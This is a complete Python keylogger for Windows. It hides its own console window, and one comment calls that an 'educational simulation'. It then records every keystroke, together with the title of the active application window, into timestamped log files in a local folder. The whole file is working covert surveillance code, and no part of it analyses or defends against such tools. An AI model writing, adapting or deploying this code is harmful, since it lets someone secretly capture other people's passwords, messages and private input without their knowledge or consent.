import os
import logging
from datetime import datetime
from pynput.keyboard import Listener
import win32gui
import ctypes

# Function to hide the console window (educational simulation)
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Create folder to store logs
folder_name = "logs"
if not os.path.exists(folder_name):
    os.makedirs(folder_name)

# Prepare the filename using current date and time
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
file_path = os.path.join(folder_name, f"log_{timestamp}.txt")

# Setup logger
logging.basicConfig(filename=file_path, level=logging.INFO, format="%(asctime)s - %(message)s")

# Keep track of the last window to detect app switches
last_window = ""

def get_foreground_window():
    handle = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(handle)

def on_key_press(key):
    global last_window
    try:
        active_window = get_foreground_window()
        if active_window and active_window != last_window:
            last_window = active_window
            logging.info(f"\n[Application]: {active_window}")

        if hasattr(key, 'char') and key.char is not None:
            logging.info(f"Typed: {key.char}")
        else:
            logging.info(f"Key: {key}")
    except Exception as e:
        logging.error(f"Error: {e}")

# Start capturing keystrokes
with Listener(on_press=on_key_press) as listener:
    listener.join()
